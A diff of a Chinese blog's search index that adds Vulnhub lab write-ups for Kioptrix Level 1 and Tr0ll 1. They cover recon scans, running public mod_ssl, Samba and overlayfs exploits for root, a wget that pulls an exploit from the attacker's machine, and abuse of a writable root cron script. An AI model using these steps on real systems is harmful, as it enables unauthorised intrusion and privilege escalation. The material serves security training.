@@ -118,6 +118,42 @@
       </tags>
   </entry>
   <entry>
+    <title>Kioptix Level 1</title>
+    <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
+    <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
+<p>靶机: 192.168.249.129</p>
+<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
+<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
+<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
+<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
+<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
+<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
+<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
+<p><code>./exp</code> —-<strong>查看下参数</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
+<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
+<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
+<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
+<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
+<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
+<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
+<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
+<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
+<p><strong>—–搞定—–</strong></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Kioptix Level 5</title>
     <url>/2021/12/12/Kioptrix-Level-5/</url>
     <content><![CDATA[<p><strong>靶机：192.168.249.134</strong><br><strong>kali:  192.168.249.132</strong></p>
@@ -172,33 +208,49 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptix Level 1</title>
-    <url>/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/</url>
-    <content><![CDATA[<p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
-<p>靶机: 192.168.249.129</p>
-<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
-<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
-<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
-<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
-<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
-<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
-<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
-<p><code>./exp</code> —-<strong>查看下参数</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
-<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
-<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
-<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
-<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
-<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
-<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
-<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
-<p><strong>—–搞定—–</strong></p>
+    <title>Tr0ll 1</title>
+    <url>/2021/12/15/Tr0ll-1/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.135</strong><br><strong>kali: 192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sS -sV -A 192.168.249.135</code>  <strong>—查看开放端口及服务探测</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/1.png"></p>
+<p><strong>21端口ftp服务</strong>、<strong>80端口</strong></p>
+<p><code>nikto -host http://192.168.249.135/</code><strong>—对80端口http服务深入探测(并无可用信息)</strong></p>
+<p><strong>访问下21端口ftp服务</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/2.png"></p>
+<p><strong>–发现个pcap数据包，用wireshark查看下追踪TCP流–</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/3.png"></p>
+<p>发现<strong>用户名/密码=anonymous/password</strong>(貌似假的ssh连不上)<br><strong>-sup3rs3cr3tdirlol-</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/4.png"></p>
+<p><strong>·访问发现一个可执行文件·</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/5.png"></p>
+<p><strong>·又发现个地址0x0856BF·</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/6.png"></p>
+<p><strong>·访问下·</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/8.png"></p>
+<p><strong>·两个文件夹都点看看·</strong><br><img src="/2021/12/15/Tr0ll-1/9.png"></p>
+<p><strong>告诉我们文件夹就是密码(Pass.txt)</strong><br><img src="/2021/12/15/Tr0ll-1/7.png"><br><img src="/2021/12/15/Tr0ll-1/10.png"></p>
+<p>–用户名估计就是txt文件里的其中一个<br>–这貌似考察的<strong>信息泄露</strong>之类的</p>
+<p>不断测试发现<strong>用户名/密码</strong>=<strong>overflow</strong>/<strong>Pass.txt</strong>(SSH连接)</p>
+<p><img src="/2021/12/15/Tr0ll-1/11.png"></p>
+<h4 id="二、0x00权限提升-overlayfs-本地提权"><a href="#二、0x00权限提升-overlayfs-本地提权" class="headerlink" title="二、0x00权限提升(overlayfs 本地提权 )"></a>二、0x00权限提升(overlayfs 本地提权 )</h4><p><code>uname -a</code>  <strong>linux查看内核版本(Linux troll 3.13.0)</strong></p>
+<p><code>lsb_release -a</code> <strong>linux查看版本(Ubuntu 14.04)</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/12.png"></p>
+<p><code>searchsploit Ubuntu 14.04</code>  <strong>–寻找有无可利用漏洞</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/13.png"></p>
+<p><code>python -m SimpleHTTPServer 8000</code><br><code>cd /tmp</code>  <strong>–权限问题cd到tmp目录</strong></p>
+<p><code>wget http://192.168.249.132:8000/37292.c</code> <strong>–将exp下载到本地</strong></p>
+<p><code>gcc 37292.c -o exp</code> <strong>—编译运行即可</strong><br><code>./exp</code></p>
+<p><img src="/2021/12/15/Tr0ll-1/14.png"></p>
+<h4 id="二、0x01权限提升-kali-ssh密钥免密登录root"><a href="#二、0x01权限提升-kali-ssh密钥免密登录root" class="headerlink" title="二、0x01权限提升(kali ssh密钥免密登录root)"></a>二、0x01权限提升(kali ssh密钥免密登录root)</h4><p>在第一个方法提权时发现ssh一段时间会自动断开，还会清空下载的文件<br>可能是设置了计划任务。</p>
+<p><code>cat /var/log/cronlog</code><strong>–查看相应日志/var/log/cronlog</strong></p>
+<p><code>find / -name cleaner.py</code> </p>
+<p><img src="/2021/12/15/Tr0ll-1/15.png"></p>
+<p><strong>/lib/log/cleaner.py脚本在计划任务中是以root权限执行的，并且该脚本是全局可写的，那么我们就可以利用这一点进行提权</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/16.png"></p>
+<p><code>ssh-keygen</code> <strong>–kali生成ssh密钥</strong></p>
+<p><img src="/2021/12/15/Tr0ll-1/17.png"><br><img src="/2021/12/15/Tr0ll-1/18.png"></p>
+<p><img src="/2021/12/15/Tr0ll-1/19.png"><br><strong>–保存后便可以在kali上免密登录靶机root权限–</strong></p>
+<p><strong>我vi不精通，脚本复制不过去。。。。试了好几次。。。</strong></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
